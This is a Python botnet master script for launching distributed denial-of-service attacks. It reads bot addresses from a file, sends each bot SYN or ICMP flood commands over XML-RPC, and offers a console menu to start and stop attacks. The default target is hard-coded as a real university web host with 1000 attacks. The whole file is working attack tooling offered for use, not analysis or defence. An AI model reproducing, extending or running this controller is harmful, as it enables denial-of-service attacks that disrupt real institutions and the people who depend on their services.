"""
message_format = {
    "type": "attack", # "attack" or "stop"
    "target_ip": "0.0.0.0",
    "attack_type": "icmp", "icmp" or "syn"
    "number_of_attack": 1
}
"""
import xmlrpc.client
import os
import threading
import socket


class CommandRunner(threading.Thread):
    def __init__(self, ip, message):
        threading.Thread.__init__(self)
        self.ip = ip
        self.message = message

    def run(self):
        # print("AAA")
        s = xmlrpc.client.ServerProxy("http://"+self.ip+":5000")
        # print(s.system.listMethods())
        s.give_command(self.message)


class DDoSMaster:
    def __init__(self):
        # self.p = Pool(2)
        self.botnets = list(set(self.getBotNetList()))
        self.message = {
            "type": "attack",  # "attack" or "stop"
            "target_ip": "igracias.telkomuniversity.ac.id",
            "attack_type": "syn",
            "number_of_attack": 1000
        }
        self.bot_thread = []
        self.log = []

    def distributeCommand(self):
        """distributing command that has been build to botnet"""
        # print(self.botnets)
        for bot in self.botnets:
            if self.message["type"] == "attack":
                print(bot + " --attacking--> " + self.message["target_ip"])
            elif self.message["type"] == "stop":
                print(bot + " --stop attacking--X " +
                      self.message["target_ip"])
            try:
                current = CommandRunner(bot, self.message)
                self.bot_thread.append(current)
                current.start()
            except ConnectionRefusedError:
                print("BotNet died! IP: ", bot)

    def buildAttack(self):
        """prepare the message attack that will send to botnet"""
        self.message["type"] = "attack"
        self.distributeCommand()

    def stopAttack(self):
        """stop attack to the target server"""
        self.message["type"] = "stop"
        self.distributeCommand()

    def getBotNetList(self):
        """view all list of available botnet"""
        ip_list = []
        with open("botnet_list.txt", "r") as file:
            ip_list = file.readlines()
            ip_list = [x.strip() for x in ip_list]
        return ip_list

    def parseMenu(self, menu):
        if menu == "1":
            # print("!")
            self.buildAttack()
            # self.distributeCommand(self.message)
        elif menu == "2":
            self.botnets = self.getBotNetList()
            print("*** BotNet List ***")
            print(self.botnets)
        elif menu == "3":
            self.botnets = self.getBotNetList()
            self.stopAttack()

    def stopThread(self, ip):
        for bot in self.bot_thread:
            if bot.ip == ip:
                bot._stop()
                break


def getMasterIpAddress():
    return socket.gethostbyname(socket.gethostname())


if __name__ == '__main__':
    this_ip = getMasterIpAddress()
    ddos = DDoSMaster()
    menu = 0
    while menu != 99:
        print("========== Welcome to DDoS Attack Application! ==========")
        print("Your IP Address: ", this_ip)
        ddos.parseMenu(menu)
        print("1. Attack Target")
        print("2. View Botnet List")
        print("3. Stop Attack")
        print("Select: ", end="")
        menu = str(input())
        os.system("cls")
